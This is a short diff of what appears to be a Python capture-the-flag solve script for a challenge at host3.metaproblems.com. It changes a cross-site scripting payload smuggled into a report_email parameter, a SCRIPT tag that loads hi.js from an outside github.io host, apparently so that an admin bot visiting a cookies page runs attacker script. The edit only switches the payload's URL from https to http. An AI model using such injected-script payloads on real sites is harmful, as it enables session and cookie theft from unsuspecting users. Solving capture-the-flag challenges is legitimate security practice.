@@ -13,7 +13,7 @@ headers = {
 }
 
 params = {
-    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='https://amazingrupak.github.io/hi.js'></SCRIPT>"@hi.com""",
+    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='http://amazingrupak.github.io/hi.js'></SCRIPT>"@hi.com""",
     'report_email': "hi@hi.com",
 }
 
